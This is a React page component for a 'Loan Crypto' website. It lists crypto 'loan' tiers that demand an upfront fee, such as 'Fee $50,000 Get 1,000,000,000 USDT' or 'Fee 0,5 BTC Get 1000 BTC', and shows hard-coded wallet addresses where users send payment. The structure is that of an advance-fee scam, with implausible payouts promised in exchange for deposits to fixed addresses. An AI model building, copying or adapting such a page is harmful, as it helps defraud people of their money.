import { useState } from "react";
import ButtonsMenu from "../components/ButtonsMenu";
import Term from "../components/Term";
import Daftar from "../components/Daftar";
import NetworkPaymentModal from "../components/NetworkPaymentModal";
import ButtonKontak from "../components/ButtonKontak";

const Home = () => {
  const [showTerm, setShowTerm] = useState(false);
  const [showNominal, setShowNominal] = useState(false);
  const [showPayment, setShowPayment] = useState("-translate-y-[200%]");
  const [heading, setHeading] = useState(
    "Select Your Preferred Coin To Receive Your Crypto Loan"
  );

  const [showBarCode, setShowBarCode] = useState({});
  const [hideDaftar, setHideDaftar] = useState(true);
  const [nominal, setNominal] = useState([]);

  const [idUserDaftar, setIdUserDaftar] = useState("");
  const [cryptoLoan, setCryptoLoan] = useState("");
  const [jumlahLoan, setJumlahLoan] = useState("");

  const walletMenu = [
    {
      nama: ["USDT", "Tether USDT"],
      nominal: [
        "Fee $1000 Get 100,000 USDT",
        "Fee $2000 Get 350,000 USDT",
        "Fee $4000 Get 600,000 USDT",
        "Fee $6000 Get 800,000 USDT",
        "Fee $10,000 Get 1,200,000 USDT",
        "Fee $20,000 Get 4,000,000 USDT",
        "Fee $40,000 Get 7,500,000 USDT",
        "Fee $50,000 Get 1,000,000,000 USDT",
      ],
    },
    {
      nama: ["BNB", "BNB Smart Chain"],
      nominal: [
        "Fee 5 BNB Get 1000 BNB",
        "Fee 10 BNB get 2000 BNB",
        "Fee 15 BNB Get 3000 BNB",
        "Fee 20 BNB Get 4000 BNB",
      ],
    },
    {
      nama: ["BTC", "Bitcoin"],
      nominal: [
        "Fee 0,5 BTC Get 1000 BTC",
        "Fee 1 BTC Get 2000 BTC",
        "Fee 1,5 BTC Get 3000 BTC",
        "Fee 2 BTC Get 4000 BTC",
      ],
    },
    {
      nama: ["ETH", "Ethereum"],
      nominal: [
        "Fee 4 ETH Get 1000 ETH",
        "Fee 7 ETH Get 2000 ETH",
        "Fee 10 ETH Get 3000 ETH",
        "Fee 12 ETH Get 4000 ETH",
      ],
    },
  ];

  const networkPayment = [
    {
      nama: "USDT (TRC20)",
      code: "TD2jZGx9jw3pd56TYsydU3eViUVs9T6UN3",
      barcode: "USDT(TRC20).jpg",
    },
    {
      nama: "USDT (BEP20)",
      code: "0x7477335ca1789D3f532510D39CAC256391326971",
      barcode: "USDT(BEP20).jpg",
    },
    {
      nama: "USDT (ERC20)",
      code: "0x7477335ca1789D3f532510D39CAC256391326971",
      barcode: "USDT(ERC20).jpg",
    },
    {
      nama: "TRON (TRX)",
      code: "TD2jZGx9jw3pd56TYsydU3eViUVs9T6UN3",
      barcode: "TRON (TRX).jpg",
    },
    {
      nama: "BNB (BEP20)",
      code: "0x7477335ca1789D3f532510D39CAC256391326971",
      barcode: "BNB (BEP20).jpg",
    },
    {
      nama: "Wallet Ethereum (ETH)",
      code: "0x7477335ca1789D3f532510D39CAC256391326971",
      barcode: "Ethereum(ETH).jpg",
    },
    {
      nama: "Bitcoin (BTC)",
      code: "bc1puqur3dp2ehmycaeumdqfnptr72c7rzafxkxx36nw03q7enr8cl6qt63kmu",
      barcode: "Bitcoin(BTC).jpg",
    },
  ];

  return (
    <>
      <section className="flex justify-center h-[100vh] w-[100vw] bg-black">
        <section className="relative bg-white border border-black py-14 px-8 w-[640px] rounded-lg flex flex-col gap-5 items-center mx-auto max-h-screen overflow-x-auto no-scrollbar">
          <div className="text-center">
            <h1>Welcome to Loan Crypto</h1>
            <p>
              Check the{" "}
              <span
                className="text-blue-500 cursor-pointer"
                onClick={() => {
                  setShowTerm(!showTerm);
                }}
              >
                Terms and conditions
              </span>
            </p>
            <p>{heading}</p>
          </div>
          <div className="w-full">
            {showNominal == true ? (
              ""
            ) : (
              <div className="grid grid-cols-2 w-full gap-5">
                {walletMenu.map((value, index) => {
                  return (
                    <div
                      key={index}
                      className={`px-2 py-5 bg-slate-400 rounded-md w-full text-center cursor-pointer`}
                      onClick={() => {
                        setNominal(value.nominal);
                        setShowNominal(true);
                        setHeading("Select How Much Loan You Want To Get");
                        setCryptoLoan(value.nama.join(" "));
                      }}
                    >
                      <p>{value.nama[0]}</p>
                      <p>{value.nama[1]}</p>
                    </div>
                  );
                })}
              </div>
            )}
            {showNominal == true ? (
              <ButtonsMenu
                nominal={nominal}
                setNominal={setNominal}
                setShowNominal={setShowNominal}
                setHeading={setHeading}
                setShowPayment={setShowPayment}
                setJumlahLoan={setJumlahLoan}
              />
            ) : (
              ""
            )}
          </div>

          <NetworkPaymentModal
            networkPayment={networkPayment}
            setShowBarCode={setShowBarCode}
            setShowPayment={setShowPayment}
            showBarCode={showBarCode}
            showPayment={showPayment}
            idUserDaftar={idUserDaftar}
            cryptoLoan={cryptoLoan}
            jumlahLoan={jumlahLoan}
          />

          <Term showTerm={showTerm} setShowTerm={setShowTerm} />
          {hideDaftar ? (
            ""
          ) : (
            <Daftar
              setHideDaftar={setHideDaftar}
              setIdUserDaftar={setIdUserDaftar}
            />
          )}

          <ButtonKontak />
        </section>
      </section>
    </>
  );
};

export default Home;
